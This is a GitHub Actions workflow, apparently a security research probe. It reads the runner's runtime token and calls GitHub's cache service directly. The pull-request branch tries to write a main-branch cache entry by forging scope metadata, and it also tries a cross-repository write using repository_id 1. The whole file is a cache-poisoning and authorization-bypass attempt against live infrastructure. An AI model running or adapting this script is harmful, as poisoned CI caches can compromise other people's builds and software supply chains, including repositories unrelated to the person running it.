name: scope-probe
on:
  push:
  pull_request:
  workflow_dispatch:
permissions: {}
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const t = process.env.ACTIONS_RUNTIME_TOKEN || '';
            const results = process.env.ACTIONS_RESULTS_URL || '';
            const claims = JSON.parse(Buffer.from(t.split('.')[1], 'base64url').toString());
            core.info(`event=${context.eventName} ref=${context.ref}`);
            core.info(`ac         = ${JSON.stringify(claims.ac)}`);
            core.info(`acsl       = ${claims.acsl}`);
            core.info(`trust_tier = ${claims.trust_tier}`);
            core.info(`repository_id = ${claims.repository_id}`);
            const VER = 'a'.repeat(64);
            const call = async (method, body, label) => {
              const url = `${results}twirp/github.actions.results.api.v1.CacheService/${method}`;
              const r = await fetch(url, { method:'POST',
                headers:{ 'Authorization':`Bearer ${t}`, 'Content-Type':'application/json' },
                body: JSON.stringify(body) });
              const txt = await r.text();
              core.info(`[${label}] HTTP ${r.status} ${txt.slice(0,260)}`);
              return { status: r.status, txt };
            };
            const MAIN_KEY = 'TRUSTED-MAIN-ONLY';
            const rid = String(claims.repository_id);
            core.info('--- probes ---');
            if (context.eventName === 'push') {
              const c = await call('CreateCacheEntry', { key: MAIN_KEY, version: VER }, 'push: create TRUSTED-MAIN-ONLY');
              try {
                const u = JSON.parse(c.txt).signed_upload_url;
                if (u) {
                  await fetch(u + '&comp=block&blockid=' + Buffer.from('0'.repeat(16)).toString('base64'),
                    { method:'PUT', headers:{'x-ms-blob-type':'BlockBlob'}, body:'TRUSTED-CONTENT' });
                  await call('FinalizeCacheEntryUpload', { key: MAIN_KEY, version: VER, size_bytes: '15' }, 'push: finalize');
                }
              } catch(e) { core.info('upload step: ' + e.message); }
            } else {
              await call('GetCacheEntryDownloadURL', { key: MAIN_KEY, restore_keys: [], version: VER }, 'PR: read main cache (documented ALLOWED)');
              await call('CreateCacheEntry', { key: 'PR-OWN-SCOPE', version: VER }, 'PR: write own scope (baseline)');
              await call('CreateCacheEntry', { key: MAIN_KEY, version: VER,
                metadata: { repository_id: rid, scope: [{ scope: 'refs/heads/main', permission: '3' }] } },
                'PR: WRITE into refs/heads/main via metadata  <== THE TEST');
              await call('CreateCacheEntry', { key: 'XREPO', version: VER,
                metadata: { repository_id: '1', scope: [{ scope: 'refs/heads/main', permission: '3' }] } },
                'PR: write with repository_id=1 (cross-repo)');
            }
